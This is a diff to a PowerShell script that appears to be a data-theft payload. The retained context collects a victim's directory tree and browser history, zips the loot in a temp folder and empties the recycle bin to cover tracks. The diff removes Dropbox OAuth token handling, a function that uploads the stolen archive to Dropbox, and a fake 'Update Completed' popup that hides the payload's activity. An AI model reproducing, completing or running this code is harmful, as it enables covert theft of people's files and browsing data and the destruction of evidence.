@@ -29,28 +29,6 @@ $ZIP = "$FolderName.zip"
 New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
-$appKey = ""
-$appSecret = ""
-$refreshToken = ""
-
-function Get-NewAccessToken {
-    $body = @{
-        grant_type = 'refresh_token'
-        refresh_token = $refreshToken
-        client_id = $appKey
-        client_secret = $appSecret
-    }
-    $response = Invoke-RestMethod -Uri 'https://api.dropboxapi.com/oauth2/token' -Method Post -Body $body
-    return $response.access_token
-}
-
-$accessToken = Get-NewAccessToken
-$db = $accessToken
-# Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
-
-#$dc = ""
-
-############################################################################################################################################################
 
 # Recon all User Directories
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
@@ -512,21 +490,6 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\B
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
-# Upload output file to dropbox
-
-function dropbox {
-$TargetFilePath="/$ZIP"
-$SourceFilePath="$env:TEMP\$ZIP"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
 
@@ -583,6 +546,3 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 		
 ############################################################################################################################################################
 
-# Popup message to signal the payload is done
-
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
